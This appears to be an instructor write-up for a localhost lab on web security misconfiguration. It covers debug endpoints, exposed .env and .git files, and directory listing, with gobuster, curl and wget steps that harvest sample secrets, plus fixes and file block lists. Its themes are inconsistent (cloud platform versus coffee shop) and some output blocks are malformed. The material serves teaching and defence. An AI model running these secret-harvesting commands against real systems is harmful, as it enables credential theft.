# A02: Security Misconfiguration - Instructor Writeup

**Lab URL:** http://localhost:3002  
**Topic:** OWASP Top 10 2025 - A02: Security Misconfiguration  
**Difficulty:** Easy → Medium → Hard  
**Theme:** CloudDeploy Platform (SaaS/Cloud Infrastructure)

---

## Overview

This lab teaches students about Security Misconfiguration through progressive challenges in a realistic cloud deployment platform. Students learn to identify debug endpoints, exposed AWS credentials, production secrets, and default admin passwords.

### Real-World Impact
- **Cloud Infrastructure Compromise:** Exposed AWS keys grant full account access
- **Data Breach:** Database credentials expose customer PII
- **Financial Loss:** Exposed Stripe API keys enable payment fraud
- **Compliance Violations:** Exposed secrets violate PCI-DSS, SOC 2

### Learning Objectives
- Identify information disclosure through debug endpoints
- Discover configuration leaks containing AWS credentials and API keys
- Exploit default credentials in production cloud systems
- Understand proper secrets management and configuration security

---

## EXAMPLE: Getting Started Guide

**URL:** http://localhost:3002/example  
**Purpose:** Educational walkthrough teaching system enumeration and diagnostic access

### Part 1: System Enumeration
**Objective:** Discover all systems through ID enumeration

**Solution:**
```bash
# Test all system IDs
curl http://localhost:3002/api/example/systems/100  # Espresso Machine
curl http://localhost:3002/api/example/systems/101  # Grinder Control
curl http://localhost:3002/api/example/systems/102  # Milk Steamer
curl http://localhost:3002/api/example/systems/103  # Maintenance System (hidden)
```

**Flag:** `NSA{DEBUG_EXAMPLE_COMPLETE}` (found at ID 103)

**Teaching Point:** Predictable system IDs allow complete enumeration of cloud infrastructure.

### Part 2: Diagnostic Access
**Objective:** Access unprotected diagnostic endpoints

**Solution:**
```bash
curl http://localhost:3002/api/example/diagnostic
```

**Flag:** `NSA{DEBUG_EXAMPLE_COMPLETE}`

**Teaching Point:** Debug and diagnostic endpoints left enabled in production expose system information.

### Part 3: Auth System Check
**Objective:** Access authentication check endpoint

**Solution:**
```bash
curl http://localhost:3002/api/example/auth-check
```

**Flag:** `FLAG{4UTH_SYST3M_CH3CK3D}`

**Teaching Point:** Even "check" endpoints can leak information about authentication mechanisms.

---

## LAB 1: Staff Dashboard (EASY - Recon)

**URL:** http://localhost:3002/lab1  
**Challenge:** Discover debug information endpoint  
**Stage:** Recon  

### Vulnerability
Debug endpoint left enabled in production environment, exposing system information.

### Required Tools
- `gobuster` - Directory/endpoint enumeration
- `curl` - HTTP API testing

### Exploitation Steps

1. **Enumerate API Endpoints:**
   ```bash
   # Discover hidden debug endpoints
   gobuster dir -u http://localhost:3002/api \
     -w /usr/share/wordlists/dirb/common.txt \
     -t 50
   
   # Look for staff/admin endpoints
   gobuster dir -u http://localhost:3002/api/staff \
     -w /usr/share/wordlists/dirb/common.txt \
     -t 50
   ```

2. **Access Debug Endpoint:**
   ```bash
   # Direct access to system-info endpoint
   curl http://localhost:3002/api/staff/system-info
   ```

3. **Extract Flag:**
   ```bash
   # Format JSON output to find flag
   curl -s http://localhost:3002/api/staff/system-info | jq '.flag'
   ```
### Flag
`NSA{D3BUG_F0UND}`

### Expected Output
```json
{
  "flag": "NSA{D3BUG_F0UND}",
  "message": "System information retrieved successfully!",
  "vulnerability": "Debug endpoint exposed - reveals system details",
  "system_info": {
    "node_version": "v20.11.0",
    "platform": "linux",
    "uptime_seconds": 1234,
    "memory_mb": 45,
    "environment": "production"
  },
  "database_host": "db.clouddeploy.io",
  "warning": "This endpoint should not be accessible in production!"
}
```

---

## LAB 2: Store Settings (MEDIUM - Scanning)

**URL:** http://localhost:3002/lab2  
**Challenge:** Discover exposed .env file through misconfiguration  
**Stage:** Scanning  

### Vulnerability
.env file and backup files accessible via web due to misconfigured static file serving.

### Required Tools
- `gobuster` - File/directory enumeration with extensions
- `curl` - HTTP file retrieval

### Exploitation Steps

1. **Enumerate Common Config Files:**
   ```bash
   # Scan for common exposed files
   gobuster dir -u http://localhost:3002 \
     -w /usr/share/wordlists/dirb/common.txt \
     -x .env,.env.backup,.git,.config \
     -t 50
   ```

2. **Test Known Vulnerable Paths:**
   ```bash
   # Try common misconfigurations
   curl http://localhost:3002/.env
   curl http://localhost:3002/.env.backup
   curl http://localhost:3002/.env.local
   curl http://localhost:3002/.git/config
   ```

3. **Extract Credentials from .env:**
   ```bash
   # Download and parse .env file
   curl -s http://localhost:3002/.env | grep -E "PASSWORD|SECRET|KEY|FLAG"
   ```

4. **Capture Flag:**
   ```bash
   curl -s http://localhost:3002/.env | grep NSA
   ```
DB_PASSWORD=Bean$cene2024!
JWT_SECRET=beanscene_jwt_secret_key_12345
SESSION_SECRET=coffee-shop-session-2024
SQUARE_API_KEY=sq0atp-BeanScene_Live_Token_xyz789
SMTP_PASS=BeanMail!2024
DEBUG_MODE=true
```

### Impact
- **Complete Credential Exposure:** All environment secrets in plaintext
- **Backup Files:** Old credentials also exposed (.env.backup)
- **Different from API Leak:** This is a web server misconfiguration

### Vulnerable Code Pattern
```javascript
// Express serves all files without restrictions
app.use(express.static('public'));

// Missing configuration to block sensitive files
// .env file is accessible at /.env
```

### Secure Implementation
```javascript
// Explicitly block sensitive files
app.use((req, res, next) => {
    const blockedFiles = ['.env', '.env.backup', '.git', '.htaccess', 
                          'wp-config.php', 'config.php'];
    if (blockedFiles.some(file => req.path.includes(file))) {
        return res.status(404).send('Not Found');
    }
    next();
});

// Use proper static file serving with restrictions
app.use(express.static('public', {
    dotfiles: 'deny',  // Block .env, .git, etc.
    index: false
}));
```

### Web Server Configuration (nginx)
```nginx
location ~ /\. {
    deny all;
    return 404;
}

location ~* \.(env|git|htaccess|htpasswd|backup|old)$ {
    deny all;
    return 404;
}
```

### Teaching Points
- .env files must NEVER be web-accessible
- Configure web servers to deny access to sensitive files
- Use .gitignore to prevent committing .env files
- Backup files (.backup, .old, ~) are often forgotten
- Static file serving needs proper security configuration
- Different attack vector than debug endpoints - this is file exposure

---

## LAB 3: Manager Portal - Directory Listing

**Difficulty:** Hard  
**Stage:** Initial Access

### Vulnerability
Directory listing enabled for /admin directory, exposing configuration files and credentials.

### Required Tools
- `gobuster` - Directory enumeration
- `curl` - HTTP requests
- `lynx` or `wget` (optional) - Download files

### Exploitation Steps

**Discover Admin Directories:**

```bash
# Enumerate directories on target
gobuster dir -u http://localhost:3002 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50

# Common admin paths to check
curl -I http://localhost:3002/admin
curl -I http://localhost:3002/admin/
curl -I http://localhost:3002/manager
curl -I http://localhost:3002/administrator
```

**Test for Directory Listing:**

```bash
# Directory listing returns HTML with file links
curl -s http://localhost:3002/admin/ | grep -E '<a href|</a>'

# Look for common sensitive files
curl -s http://localhost:3002/admin/ | grep -E 'config|credentials|backup|log'
```

**Access Sensitive Files:**

```bash
# Retrieve credentials file
curl -s http://localhost:3002/admin/credentials.txt

# Download config files
curl -s http://localhost:3002/admin/config.json | jq '.'

# Extract flag
curl -s http://localhost:3002/admin/credentials.txt | grep -o 'NSA{[^}]*}'
```

**Alternative: Using wget to Mirror Directory**

```bash
# Download entire admin directory
wget -r -np -nH --cut-dirs=1 http://localhost:3002/admin/

# Search downloaded files for flags
grep -r "NSA{" admin/
```

**Enumerate Subdirectories:**

```bash
# Check for backup directories
curl -I http://localhost:3002/admin/backup/
curl -I http://localhost:3002/admin/logs/
curl -I http://localhost:3002/admin/tmp/

# Download all accessible files
for file in config.json credentials.txt settings.xml; do
  curl -s http://localhost:3002/admin/$file -o $file
  echo "Downloaded: $file"
done
```
=================================
Username: manager
Password: Coffee2024!
API Key: BSC-2024-ADMIN-xyz789

FLAG{D1R3CT0RY_L1ST1NG_3N4BL3D}

WARNING: This file should not be web-accessible!
```

### Impact
- **Complete Admin Access:** Username, password, and API keys exposed
- **Directory Enumeration:** Attackers can see all files in admin directory
- **Further Exploration:** Backup and log directories may contain more secrets

### Vulnerable Code Pattern
```javascript
// Express default behavior or misconfigured static serving
app.use('/admin', express.static('admin'));

// Missing configuration to prevent directory listing
// No index.html file, so Express shows directory contents
```

### Secure Implementation
```javascript
// 1. Disable directory listing in Express
app.use('/admin', express.static('admin', {
    index: false,  // Don't serve directory listings
    dotfiles: 'deny'
}));

// 2. Add middleware to block directory access
app.use('/admin', (req, res, next) => {
    if (req.path.endsWith('/')) {
        return res.status(404).send('Not Found');
    }
    next();
});

// 3. Better: Don't expose admin files via web at all
// Admin files should not be in web-accessible directories

// 4. Use authentication for admin areas
app.use('/admin', requireAuth, requireAdmin);
```

### Web Server Configuration (nginx)
```nginx
location /admin {
    autoindex off;  # Disable directory listing
    auth_basic "Admin Area";
    auth_basic_user_file /etc/nginx/.htpasswd;
}
```

### Apache Configuration (.htaccess)
```apache
Options -Indexes
<Files "credentials.txt">
    Require all denied
</Files>
```

### Teaching Points
- Directory listing reveals file structure to attackers
- Admin directories should never be web-accessible
- Different from previous labs: file system level misconfiguration
- Always disable autoindex/directory browsing in production
- Sensitive files like credentials.txt should not exist in web root
- Use authentication for admin areas, not just obscurity

---

## Common Student Questions

**Q: Why is misconfiguration so common?**  
A: Developers often enable debug features during development and forget to disable them. Default configurations are rarely changed. DevOps complexity leads to overlooked settings.

**Q: How can we prevent these issues in CI/CD?**  
A: Use configuration scanning tools, secrets detection (git-secrets, TruffleHog), infrastructure-as-code validation, and automated security testing in pipelines.

**Q: What tools detect misconfigurations?**  
A: Nikto, Nmap, OWASP ZAP, Burp Suite, custom scripts, cloud security posture management tools (CSPM).

**Q: Should we remove debug endpoints or just protect them?**  
A: Remove them entirely in production builds. If absolutely needed, protect with authentication, authorization, and IP whitelisting.

---

## Remediation Summary

### Key Takeaways
1. ✅ Disable debug features in production
2. ✅ Never expose configuration via APIs
3. ✅ Use secret management services
4. ✅ Force default credential changes
5. ✅ Implement proper access controls
6. ✅ Regular security audits of configurations

### Prevention Checklist
- [ ] All debug endpoints disabled in production
- [ ] No hardcoded secrets in code
- [ ] Environment-specific configurations
- [ ] Default credentials changed/disabled
- [ ] Configuration access requires authentication
- [ ] Secrets stored in vault/secret manager
- [ ] Regular configuration security reviews
- [ ] Automated misconfiguration scanning

### Tools & Resources
- **Scanning:** Nikto, OWASP ZAP, Lynis
- **Secrets Detection:** git-secrets, TruffleHog, GitGuardian
- **Secret Management:** HashiCorp Vault, AWS Secrets Manager, Azure Key Vault
- **Standards:** CIS Benchmarks, NIST guidelines

---

## Additional Resources
- [OWASP Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [OWASP Configuration Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Configuration_Management_Cheat_Sheet.html)
